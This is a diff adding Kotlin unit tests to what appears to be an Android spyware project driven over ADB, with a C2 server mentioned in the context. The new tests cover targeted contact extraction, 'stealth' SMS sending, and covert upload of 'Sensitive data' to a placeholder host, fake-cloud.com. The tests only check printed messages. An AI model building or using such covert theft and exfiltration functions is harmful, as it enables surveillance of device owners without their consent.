@@ -239,4 +239,34 @@ class MainTest {
         val output = outputStreamCaptor.toString().trim()
         assertTrue(output.contains("Stopping C2 server"))
     }
+
+    @Test
+    fun testExtractTargetedContacts() {
+        val adb = ADBBase()
+        val keywords = listOf("John", "Doe")
+        val contacts = adb.extractTargetedContacts(keywords)
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Extracting contacts matching keywords"))
+        assertTrue(output.contains(contacts))
+    }
+
+    @Test
+    fun testSendStealthSMS() {
+        val adb = ADBBase()
+        val phoneNumber = "1234567890"
+        val data = "Test message"
+        adb.sendStealthSMS(phoneNumber, data)
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Sending stealth SMS to $phoneNumber"))
+    }
+
+    @Test
+    fun testUploadDataStealthily() {
+        val adb = ADBBase()
+        val data = "Sensitive data"
+        val uploadUrl = "http://fake-cloud.com/upload"
+        adb.uploadDataStealthily(data, uploadUrl)
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Simulating data upload"))
+    }
 }
